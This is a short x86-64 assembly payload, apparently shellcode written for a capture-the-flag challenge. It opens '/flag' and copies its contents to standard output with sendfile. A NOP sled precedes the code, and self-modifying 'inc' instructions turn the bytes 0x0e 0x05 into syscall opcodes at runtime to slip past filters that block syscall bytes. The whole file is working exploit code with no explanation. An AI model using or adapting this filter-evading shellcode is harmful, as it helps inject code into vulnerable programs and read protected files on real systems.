.globl _start
.intel_syntax noprefix

_start:
    .rept 0x1000
    nop
    .endr
    lea edi, [rip+flag]     # Ptr to "/flag" string
    xor eax, eax
    mov al, 2               # SYS_open
    xor esi, esi            # O_RDONLY
    inc WORD PTR [rip]
_open_syscall:
    .byte 0x0e, 0x05

    xor edi, edi
    inc edi                 # fd out
    mov esi, eax            # fd in
    xor edx, edx            # skipped bytes
    mov bl, 88
    mov r10, rbx            # bytes to transfer
    mov al, 40              # SYS_sendfile
    inc WORD PTR [rip]
_sendfile_syscall:
    .byte 0x0e, 0x05

    mov al, 60              # SYS_exit
    inc WORD PTR [rip]
_exit_syscall:
    .byte 0x0e, 0x05

flag:
    .string "/flag"
